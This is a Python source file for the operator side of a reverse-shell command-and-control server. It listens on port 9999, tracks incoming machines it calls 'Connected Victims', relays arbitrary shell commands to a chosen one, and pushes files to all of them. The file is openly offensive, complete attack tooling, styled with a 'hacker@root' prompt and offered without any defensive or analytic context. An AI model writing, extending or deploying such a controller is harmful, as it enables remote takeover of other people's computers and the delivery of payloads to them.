import socket
import threading
import os

# Define some hacker-style variables
NUM_THREADS = 2
JOB_THREADS = {1, 2}
all_connections = []
all_addresses = []

def create_socket():
    try:
        global host
        global port
        global s
        host = ""  # The hacker's IP address (maybe)
        port = 9999  # The hacker's chosen port (obviously)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as msg:
        print("ERROR: Couldn't create the socket: " + str(msg))

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding to the Port: " + str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("ERROR: Couldn't bind the socket: " + str(msg) + "\n" + "Retrying...")
        bind_socket()

def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("Connection has been established! | IP " + address[0] + " | Port " + str(address[1]))
        except:
            print("ERROR: Failed to accept connections. Something's not right.")

def start_shell():
    while True:
        cmd = input('hacker@root:~$ ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            target = cmd.replace('select ', '')
            if target.isdigit():
                target = int(target)
                conn = get_target(target)
                if conn is not None:
                    send_commands(conn)
            else:
                print("ERROR: Invalid target format. Please enter a valid index.")
        elif cmd == 'quit':
            close_connections()
            break
        elif 'send' in cmd:
            cmd_parts = cmd.split()
            if len(cmd_parts) > 1:
                send_file(cmd_parts[1])
            else:
                print("ERROR: Usage: send <file_path>")
        else:
            print("ERROR: Command not recognized")

def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
    print('----Connected Victims----' + '\n' + results)

def get_target(target):
    try:
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print("ERROR: Not a valid selection")
        return None

def send_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("ERROR: Connection lost")
            break

def send_file(file_path):
    if os.path.exists(file_path):
        for conn in all_connections:
            try:
                with open(file_path, 'rb') as file:
                    conn.send(file.read())
                print(f"File '{file_path}' sent successfully to all victims.")
            except Exception as e:
                print(f"ERROR: Failed to send file to {all_addresses[all_connections.index(conn)][0]}: {str(e)}")
    else:
        print("ERROR: File not found.")

def close_connections():
    for conn in all_connections:
        conn.close()

def main():
    create_socket()
    bind_socket()
    accept_thread = threading.Thread(target=accept_connections)
    accept_thread.start()
    shell_thread = threading.Thread(target=start_shell)
    shell_thread.start()

if __name__ == "__main__":
    main()